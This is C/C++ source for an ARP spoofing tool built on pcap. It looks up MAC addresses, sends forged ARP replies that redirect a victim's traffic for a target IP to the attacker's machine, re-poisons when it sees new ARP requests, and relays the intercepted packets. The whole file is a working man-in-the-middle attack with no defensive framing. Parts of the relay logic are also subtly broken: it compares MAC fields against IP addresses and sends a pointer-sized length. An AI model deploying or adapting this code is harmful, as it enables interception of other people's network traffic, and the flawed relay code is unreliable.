#include "arp_spoof.h"

void usage()
{
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void convert_argv_into_ip(uint8_t* IP, char* argv)
{
    char* IPstring = strdup(argv);
    char* p = strtok(IPstring, ".");
    int i = 0;
    while(p != NULL)
    {
        IP[i] = strtoul(p, nullptr, 10);
        p = strtok(NULL, ".");
        i++;
    }
}

void get_attacker_mac(char* dev, uint8_t* attackermac)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        int i;
        for (i = 0; i < 6; ++i)
        {
//            printf(" %02x", static_cast<uint8_t>(s.ifr_addr.sa_data[i]));
            attackermac[i] = static_cast<uint8_t>(s.ifr_addr.sa_data[i]);
        }
        puts("\n");
    }

}


void get_node_MAC(pcap_t* fp, const uint8_t* attacker_MAC, const uint8_t* node_IP, uint8_t* node_mac)
{
    arp_packet arp_req_packet;
    //Ethernet header

    memset(arp_req_packet.eth_hdr.h_dest, 0xff, 6); //set broadcast MAC
    memcpy(arp_req_packet.eth_hdr.h_source, attacker_MAC, 6); //set source MAC
    arp_req_packet.eth_hdr.h_proto = htons(ETH_P_ARP);

    //ARP header
    arp_req_packet.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req_packet.arp_hdr.ea_hdr.ar_pro = htons(0x0800);
    arp_req_packet.arp_hdr.ea_hdr.ar_hln = 0x06;
    arp_req_packet.arp_hdr.ea_hdr.ar_pln = 0x04;
    arp_req_packet.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REQUEST);
    memcpy(arp_req_packet.arp_hdr.arp_sha, attacker_MAC, 6);
    memset(arp_req_packet.arp_hdr.arp_tha, 0x00, 6);
    memset(arp_req_packet.arp_hdr.arp_spa, 0x00, 4);
    memcpy(arp_req_packet.arp_hdr.arp_tpa, node_IP, 4);

    //send
    u_char arp_to_send[42];
    memcpy(arp_to_send, &arp_req_packet, sizeof(arp_packet));
    if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_req_packet))) != 0)
    {
        fprintf(stderr, "\nSending ARP_Request Failed");
        return;
    }
    else
    {
        while (true)    //capturing
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(fp, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
//            printf("%u bytes captured\n", header->caplen);
            arp_packet* arp_rep_packet = reinterpret_cast<arp_packet*>(const_cast<u_char*>(packet));
            if ((memcmp(arp_rep_packet->arp_hdr.arp_tpa, arp_rep_packet->arp_hdr.arp_spa, 4) == 0 )
                    && (ntohs(arp_rep_packet->eth_hdr.h_proto) == ETH_P_ARP)) //checking
            {
                memcpy(node_mac, arp_rep_packet->arp_hdr.arp_sha, 6);
                return;
            }
        }
    }
}

void arp_spoof(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* attacker_MAC, uint8_t* target_IP)
{
    arp_packet arp_poison;  //attack packet
    //ethernet header field
    memcpy(arp_poison.eth_hdr.h_dest, sender_MAC, 6);
    memcpy(arp_poison.eth_hdr.h_source, attacker_MAC, 6);
    arp_poison.eth_hdr.h_proto = htons(ETH_P_ARP);

    //arp header field
    arp_poison.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
    arp_poison.arp_hdr.ea_hdr.ar_hln = 0x06;
    arp_poison.arp_hdr.ea_hdr.ar_pln = 0x04;
    arp_poison.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_poison.arp_hdr.ea_hdr.ar_pro = htons(0x0800);
    memcpy(arp_poison.arp_hdr.arp_sha, attacker_MAC, 6);
    memcpy(arp_poison.arp_hdr.arp_tha, sender_MAC, 6);
    memcpy(arp_poison.arp_hdr.arp_spa, target_IP, 4);
    memcpy(arp_poison.arp_hdr.arp_tpa, sender_IP, 4);

    //casting
    u_char arp_to_send[42];
    memcpy(arp_to_send, &arp_poison, sizeof(arp_poison));

    //send attack packet 3 times
    for (int i = 0; i < 3; i++)
    {
        if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_to_send))) != 0)
            fprintf(stderr, "\nSending ARP_Request Failed");
        else
            printf("Succeed: Sending ARP_Poison Packet.");
    }
}

void convert_relaying_packet(u_char* packet, uint8_t* attacker_mac, uint8_t* target_mac)
{
    ethhdr eth_hdr;
    memcpy(&eth_hdr.h_dest, target_mac, sizeof(eth_hdr.h_dest));
    memcpy(&eth_hdr.h_source, attacker_mac, sizeof (eth_hdr.h_source));
    memcpy(packet, &eth_hdr, sizeof(eth_hdr.h_dest) + sizeof(eth_hdr.h_source));
}

void attack(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* target_MAC, uint8_t* target_IP, uint8_t* attacker_MAC)
{
    arp_spoof(fp, sender_MAC, sender_IP, attacker_MAC, target_IP); //1. arp spoofing

    while(true) //2. capturing
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(fp, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);

        arp_packet arp_pckt;
        memcpy(&arp_pckt, packet, sizeof(arp_packet));

        if(arp_pckt.eth_hdr.h_proto == htons(ETH_P_ARP) && arp_pckt.arp_hdr.ea_hdr.ar_op == htons(ARPOP_REQUEST) &&
                memcmp(&arp_pckt.arp_hdr.arp_tpa, target_IP, 4) == 0)
        {
           arp_spoof(fp, sender_MAC, sender_IP, attacker_MAC, target_IP);
        }
        else
        {
            if ( memcmp(&arp_pckt.eth_hdr.h_source, sender_IP, 4) == 0) //relaying (sender to target)
                convert_relaying_packet(const_cast<u_char*>(packet), attacker_MAC, target_MAC);
            else if ( memcmp(&arp_pckt.eth_hdr.h_source, target_IP, 4) == 0) // relaying (target to sender)
                convert_relaying_packet(const_cast<u_char*>(packet), attacker_MAC, sender_MAC);

            if(pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
                printf("Failed: Packet relaying.");
        }
    }
}
